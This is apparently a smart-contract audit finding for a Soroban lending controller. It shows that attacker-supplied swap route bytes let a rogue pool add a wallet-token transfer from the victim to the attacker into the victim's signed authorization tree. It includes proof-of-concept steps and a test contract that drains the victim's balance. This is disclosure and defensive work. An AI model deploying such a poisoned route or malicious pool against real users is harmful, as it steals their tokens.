### Title
Attacker-controlled swap routes can append a caller-authorized wallet-token theft - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Router strategy entrypoints accept opaque, caller-supplied route bytes and execute arbitrary venue code beneath the caller’s `require_auth` authorization. A malicious hop can therefore add an unrelated `token.transfer(caller, attacker, amount)` to the signed authorization tree while still returning enough output to satisfy the controller’s settlement checks. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_collateral` exposes a caller-controlled `swap: Bytes` argument and requires only that the caller is the account owner or an active delegate. [4](#0-3) [5](#0-4) 

The controller authorizes only its own exact input-token transfer to the configured router, but then invokes the router with the uninterpreted route payload. [6](#0-5) 

Afterward, the controller checks only that its input spend does not exceed `amount_in` and that the output-token balance increased by a positive amount; it does not restrict which contracts the route invoked or which additional authorization children the user signed. [7](#0-6) 

Soroban records authorization requirements as a tree under `swap_collateral`; a malicious pool invoked by the route can request `wallet_token.transfer(victim, attacker, victim_balance)`, and the transfer succeeds when the victim signs the simulated tree. [8](#0-7) 

### Impact Explanation
An attacker can steal tokens unrelated to the lending operation from a victim’s wallet by supplying a poisoned route. The theft is not bounded by the collateral amount, route input, router output, or account solvency because the malicious token transfer is authorized as a child of the victim’s strategy authorization. [9](#0-8) 

The regression test demonstrates a victim losing the entire `WALLET_BALANCE` of an unrelated token while still receiving the expected swap collateral. [10](#0-9) 

### Likelihood Explanation
The attacker needs no protocol privilege and can deploy the malicious venue and construct the route payload. Exploitation requires a victim to sign a strategy transaction whose authorization tree contains the extra transfer, so the practical risk depends on clients accurately exposing nested authorizations and users inspecting opaque route bytes. [11](#0-10) [12](#0-11) 

The vulnerable surface is reachable through ordinary owner-authorized strategy calls such as `swap_collateral`, and similar route-carrying operations include `multiply`, `swap_debt`, and `repay_debt_with_collateral`. [13](#0-12) [14](#0-13) [15](#0-14) 

### Recommendation
Restrict swap venues and pool contracts to a governance-approved on-chain allowlist instead of allowing route bytes to name arbitrary executable contracts. [11](#0-10) 

In addition, clients should decode route payloads before signing and reject any authorization tree containing children other than the expected strategy/input-transfer authorization. [16](#0-15) 

### Proof of Concept
1. Deploy a malicious pool whose swap callback executes `token::Client::new(&wallet_token).transfer(&victim, &attacker, &victim_balance)`. [17](#0-16) 
2. Encode a route that names that pool while providing a fair `token_out` payment so settlement succeeds. [18](#0-17) 
3. Have the victim invoke `swap_collateral(victim, account_id, current, amount, new, poisoned_route)` and sign the simulated authorization tree. [19](#0-18) 
4. The malicious transfer is recorded beneath the victim’s `swap_collateral` authorization, transfers the unrelated wallet balance to the attacker, and the fair output is deposited as collateral. [20](#0-19)

### Citations

**File:** contracts/controller/src/lib.rs (L225-236)
```rust
    fn multiply(
        env: Env,
        caller: Address,
        account_id: u64,
        spoke_id: u32,
        collateral: HubAssetKey,
        debt_to_flash_loan: i128,
        debt: HubAssetKey,
        mode: PositionMode,
        swap: Bytes,
        initial_payment: Option<(HubAssetKey, i128)>,
        convert_swap: Option<Bytes>,
```

**File:** contracts/controller/src/lib.rs (L258-266)
```rust
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
```

**File:** contracts/controller/src/lib.rs (L280-302)
```rust
    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/lib.rs (L311-319)
```rust
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/controller/src/strategies/swap.rs (L74-83)
```rust
/// Returns the output balance increase; rejects zero or negative receipts.
fn verify_router_output(env: &Env, token_out: &Address, balance_before: i128) -> i128 {
    let received = balance_delta_since(
        env,
        token_out,
        &env.current_contract_address(),
        balance_before,
    );
    assert_with_error!(env, received > 0, StrategyError::NoSwapOutput);
    received
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-48)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L199-204)
```rust
    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L206-226)
```rust
    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** common/src/token.rs (L33-51)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
```
